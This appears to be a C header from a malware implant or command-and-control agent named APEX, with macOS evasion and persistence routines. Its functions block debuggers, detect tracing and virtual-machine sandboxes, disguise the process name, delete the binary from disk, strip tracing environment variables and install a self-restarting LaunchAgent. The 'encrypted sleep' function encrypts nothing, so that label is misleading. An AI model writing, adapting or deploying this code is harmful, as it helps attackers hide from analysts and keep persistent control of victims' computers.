#ifndef APEX_EVASION_MACOS_H
#define APEX_EVASION_MACOS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <signal.h>
#include <mach-o/dyld.h>
#include <time.h>

/* ── Anti-Debug: PT_DENY_ATTACH ──────────────────────────────
   macOS-specific ptrace flag that prevents any debugger from
   attaching to this process. Used by Apple's own apps.
   Once set, any ptrace(PT_ATTACH) from another process fails.
*/
#ifndef PT_DENY_ATTACH
#define PT_DENY_ATTACH 31
#endif

static int anti_debug_deny_attach(void) {
    return ptrace(PT_DENY_ATTACH, 0, 0, 0);
}

/* ── Anti-Debug: sysctl P_TRACED check ───────────────────────
   Queries the kernel via sysctl to check if the process has
   the P_TRACED flag set (indicating a debugger is attached).
*/
static int anti_debug_sysctl(void) {
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    struct kinfo_proc info;
    size_t size = sizeof(info);
    memset(&info, 0, sizeof(info));
    if (sysctl(mib, 4, &info, &size, NULL, 0) == 0) {
        if (info.kp_proc.p_flag & P_TRACED)
            return -1; /* debugger detected */
    }
    return 0;
}

/* ── Process Name Masking ────────────────────────────────────
   On macOS there's no prctl. We modify argv[0] to change what
   shows in ps and Activity Monitor.
*/
static void mask_cmdline_macos(int argc, char **argv, const char *fake) {
    if (argc < 1 || !argv || !argv[0]) return;
    size_t total = 0;
    for (int i = 0; i < argc; i++)
        total += strlen(argv[i]) + 1;
    memset(argv[0], 0, total);
    strncpy(argv[0], fake, total - 1);
}

/* ── Self-Delete Binary ──────────────────────────────────────
   Deletes the agent binary from disk. macOS keeps the process
   running from the in-memory mapping.
*/
static int self_delete_macos(void) {
    char path[4096];
    uint32_t size = sizeof(path);
    if (_NSGetExecutablePath(path, &size) != 0) return -1;
    /* Resolve symlinks */
    char resolved[4096];
    if (!realpath(path, resolved)) return -1;
    return unlink(resolved);
}

/* ── Environment Cleanup ─────────────────────────────────────
   Remove tracing-related environment variables.
*/
static void clean_env_macos(void) {
    unsetenv("DYLD_INSERT_LIBRARIES");
    unsetenv("DYLD_FORCE_FLAT_NAMESPACE");
    unsetenv("DYLD_PRINT_LIBRARIES");
    unsetenv("MallocStackLogging");
    unsetenv("NSZombieEnabled");
}

/* ── Sandbox Detection ───────────────────────────────────────
   Check for VM indicators on macOS.
*/
static int detect_sandbox_macos(void) {
    /* Check CPU count */
    int mib[2] = { CTL_HW, HW_NCPU };
    int ncpu = 0;
    size_t len = sizeof(ncpu);
    if (sysctl(mib, 2, &ncpu, &len, NULL, 0) == 0 && ncpu < 2)
        return 1;

    /* Check physical memory (< 2GB suspicious for macOS) */
    int64_t memsize = 0;
    len = sizeof(memsize);
    if (sysctlbyname("hw.memsize", &memsize, &len, NULL, 0) == 0) {
        if (memsize < 2LL * 1024 * 1024 * 1024)
            return 1;
    }

    return 0;
}

/* ── Encrypted Sleep (macOS) ─────────────────────────────── */
static void encrypted_sleep_macos(unsigned int ms) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

/* ── Persistence: LaunchAgent Plist ──────────────────────────
   Writes a LaunchAgent plist for user-level persistence.
   The agent will restart on login.
*/
static int install_persistence_launchagent(const char *binary_path, const char *label) {
    char plist_path[512];
    const char *home = getenv("HOME");
    if (!home) return -1;
    snprintf(plist_path, sizeof(plist_path),
             "%s/Library/LaunchAgents/%s.plist", home, label);

    FILE *f = fopen(plist_path, "w");
    if (!f) return -1;
    fprintf(f,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n<dict>\n"
        "  <key>Label</key><string>%s</string>\n"
        "  <key>ProgramArguments</key><array><string>%s</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "  <key>KeepAlive</key><true/>\n"
        "</dict>\n</plist>\n", label, binary_path);
    fclose(f);
    return 0;
}

#endif /* APEX_EVASION_MACOS_H */
